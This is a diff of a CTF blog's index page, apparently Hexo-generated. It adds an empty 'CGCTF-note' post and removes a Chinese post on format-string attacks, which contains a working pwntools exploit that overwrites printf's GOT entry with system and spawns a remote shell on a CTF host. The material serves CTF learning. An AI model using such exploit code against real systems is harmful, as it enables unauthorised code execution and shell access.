@@ -202,6 +202,61 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-CGCTF-note" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/13/CGCTF-note/" class="article-date">
+      <time datetime="2019-03-13T15:19:00.000Z" itemprop="datePublished">2019-03-13</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/13/CGCTF-note/">CGCTF-note</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-32位程序调用64位代码" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -726,66 +781,6 @@
         <p class="article-more-link">
           <a href="/2018/11/26/NCTF2018/#more">more >></a>
         </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-格式化字符串" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/11/21/格式化字符串/" class="article-date">
-      <time datetime="2018-11-21T06:37:21.000Z" itemprop="datePublished">2018-11-21</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/21/格式化字符串/">格式化字符串</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>printf()函数如果没有给定格式化参数，就可以利用它来任意读写。<br>像是带canary保护的程序，可以调试一下看一下canary在栈中的位置，然后用<code>%位置$x</code>这样的形式来读取canary。</p>
-<p>利用<code>%num$n</code>的形式可以进行任意写（num的取值一般从栈中第一个可以控制的位置开始）。<br>例如<code>\x02\x03\x04\x08%num$n</code>就是在0x08040302的位置写上4，因为<code>\x02\x03\x04\x08</code>是四个字节。如果想多写一点的话可以用<code>\x02\x03\x04\x08%12c%num$n</code>这样的，就有16个字节，就写上了10（十六进制表示）。</p>
-<p>例如whalectf上的pwn3:</p>
-<p>利用格式化字符串，把printf的got表覆盖为system函数，这样下次调用printf的时候就是调用system函数了。但是%n的话是一次性写4个字节，会发送很多数据，因为每多写1就要多发送一个字节。可以使用%hhn对一个字节进行写。这里system_plt的第一个字节是0x10，而前面payload正好已经发送了16个字节，所以就不需要再添加字节，直接<code>%7$hhn</code>就行了。至于第一个可控制的位置，可以先调试一下程序，发送一下AAAAAAAAA，然后看栈里的数据就很容易知道是7了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;bamboofox.cs.nctu.edu.tw&quot;,22003)</span><br><span class="line">printf_got=0x0804a00c</span><br><span class="line">system_plt=0x08048410</span><br><span class="line">payload=p32(printf_got)</span><br><span class="line">payload+=p32(printf_got+1)</span><br><span class="line">payload+=p32(printf_got+2)</span><br><span class="line">payload+=p32(printf_got+3)</span><br><span class="line">payload+=&quot;%7$hhn&quot;</span><br><span class="line">payload+=&quot;%&quot;</span><br><span class="line">payload+=str(0x84-0x10)</span><br><span class="line">payload+=&quot;c%8$hhn&quot;</span><br><span class="line">payload+=&quot;%&quot;</span><br><span class="line">payload+=str(0x104-0x84)</span><br><span class="line">payload+=&quot;c%9$hhn&quot;</span><br><span class="line">payload+=&quot;%&quot;</span><br><span class="line">payload+=str(0x08-0x04)</span><br><span class="line">payload+=&quot;c%10$hhn&quot;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
       
       <div class="clearfix"></div>
     </div>
